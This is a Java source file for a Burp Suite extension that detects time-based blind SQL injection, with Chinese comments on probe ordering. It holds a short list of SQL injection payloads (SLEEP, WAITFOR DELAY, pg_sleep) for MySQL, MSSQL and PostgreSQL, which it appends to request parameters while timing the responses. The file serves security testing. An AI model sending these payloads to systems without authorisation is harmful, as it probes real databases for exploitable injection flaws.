package burp.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;

/**
 * 延时注入 — 最少探针轮询，命中即停
 *
 * 策略：' 前缀优先（覆盖 ~90% 场景，3 探针），
 *       未命中则用 " 前缀兜底（2 探针）。
 *       ')' / ")' 括号闭合场景已由 ErrorBased 覆盖，不再重复探测。
 *       Oracle DBMS_PIPE 边缘场景极少可用，移除以精简请求。
 */
public class TimeBasedInjection extends AbstractInjectionStrategy {

    private static final String[][] PROBES = {
        // Phase 1: 单引号 — 覆盖最广（MySQL→MSSQL→PostgreSQL，按市占率排序）
        {"' AND SLEEP(5)-- -",                             "MySQL"},
        {"'; WAITFOR DELAY '0:0:5'-- -",                   "MSSQL"},
        {"' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",        "PostgreSQL"},
        // Phase 2: 双引号兜底（仅在 ' 未命中时尝试）
        {"\" AND SLEEP(5)-- -",                            "MySQL"},
        {"\"; WAITFOR DELAY '0:0:5'-- -",                  "MSSQL"},
    };
    private final ThreadLocal<String> lastPayload = ThreadLocal.withInitial(() -> "");
    private volatile long timeThreshold = 4000;

    public TimeBasedInjection(MontoyaApi api){super(api);}
    @Override public String getName(){return"Time-Based";}
    @Override public String getVulnType(){return"timesql";}
    @Override public String getPayload(){return lastPayload.get();}

    public void setTimeThreshold(long ms){ this.timeThreshold = ms; }

    @Override
    public HttpRequestResponse execute(HttpRequest origReq, HttpRequestResponse baseRR,
                                         HttpParameter param, String baseBody) {
        // 基线耗时：复用 baseRR（不再单独发送基线请求），延时判定下限 1000ms
        long baseTime = 1; // Math.max(baseTime * 5, 1000) → 下限 1000ms
        short baseCode = statusCode(baseRR);

        for (String[] probe : PROBES) {
            lastPayload.set(probe[0]);
            long t1 = System.currentTimeMillis();
            HttpRequestResponse rr = send(append(origReq, param, lastPayload.get()));
            if (rr == null) continue;
            if (isDifferentPage(baseBody, body(rr), baseCode, statusCode(rr))) continue;
            long elapsed = System.currentTimeMillis() - t1;

            if (elapsed >= timeThreshold && elapsed > Math.max(baseTime * 5, 1000)) {
                return rr;
            }
        }
        return null;
    }
}
